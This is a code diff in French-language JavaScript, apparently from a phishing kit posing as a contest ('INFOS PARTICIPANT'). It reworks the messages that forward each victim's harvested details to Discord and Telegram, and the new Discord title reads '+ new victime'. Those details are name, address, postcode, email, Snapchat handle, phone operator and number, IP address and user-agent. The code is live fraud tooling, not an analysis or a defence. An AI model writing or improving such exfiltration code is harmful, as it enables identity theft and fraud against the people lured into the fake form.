@@ -120,41 +120,43 @@
       const ua = step1.ua || "Inconnu";
 
       const discordEmbed = {
-        title: "[🎲] INFOS PARTICIPANT [🎲]",
-        color: 0x9B00FF,
-        fields: [
-          { name: "🚀 Nom", value: step2.nom, inline: true },
-          { name: "🚀 Prénom", value: step2.prenom, inline: true },
-          { name: "🚀 Opérateur", value: step1.operateur || "Non fourni", inline: true },
-          { name: "🚀 Téléphone", value: step1.telephone || "Non fourni", inline: true },
-          { name: "🚀 Adresse", value: step2.adresse || "Non fournie", inline: false },
-          { name: "🚀 Ville", value: step2.ville, inline: true },
-          { name: "🚀 Code Postal", value: step2.codePostal, inline: true },
-          { name: "🚀 E‑Mail", value: step2.email, inline: true },
-          { name: "🚀 Snapchat", value: step2.snap, inline: true },
-          {
-            name: "🌐 TIERS",
-            value:
-              `[🌐] TIERS [🌐]\n` +
-              `🌐 Adresse IP : ${ip}\n` +
-              `🌐 User-Agent : ${ua}`,
-            inline: false
-          }
-        ],
-        timestamp: new Date().toISOString()
-      };
-
+const embed = {
+  title: "[☎️] + new victime [☎️]",
+  color: 0x9B00FF,
+  fields: [
+    {
+      name: "\u200B", // Champ vide pour éviter un sous-titre visible
+      value:
+        `[🎲] INFOS [🎲]\n\n` +
+        `🚀 Nom          : ${step2.nom}\n` +
+        `🚀 Prénom       : ${step2.prenom}\n` +
+        `🚀 Adresse      : ${step2.adresse || 'Non fournie'}\n` +
+        `🚀 Ville        : ${step2.ville}\n` +
+        `🚀 Code Postal  : ${step2.codePostal}\n` +
+        `🚀 E‑Mail       : ${step2.email}\n` +
+        `🚀 Snapchat     : ${step2.snap}\n\n` +
+        `[📞] Phone [📞]\n` +
+        `💶 Opérateur    : ${step1.operateur || 'Non fourni'}\n` +
+        `💶 Téléphone    : ${step1.telephone || 'Non fourni'}\n\n` +
+        `[🌐] TIERS [🌐]\n` +
+        `🌐 Adresse IP   : ${ip}\n` +
+        `🌐 User-Agent   : ${ua}`
+    }
+  ],
+  timestamp: new Date().toISOString()
+};
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
         `🚀 Nom : ${step2.nom}\n` +
         `🚀 Prénom : ${step2.prenom}\n` +
-        `🚀 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
-        `🚀 Téléphone : ${step1.telephone || 'Non fourni'}\n` +
         `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
         `🚀 Ville : ${step2.ville}\n` +
         `🚀 Code Postal : ${step2.codePostal}\n` +
         `🚀 E‑Mail : ${step2.email}\n` +
         `🚀 Snapchat : ${step2.snap}\n\n` +
+        `[📞] Phone [📞]\n` +
+        `💶 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
+        `💶 Téléphone : ${step1.telephone || 'Non fourni'}\n` +
         `[🌐] TIERS [🌐]\n` +
         `🌐 Adresse IP : ${ip}\n` +
         `🌐 User-Agent : ${ua}`;
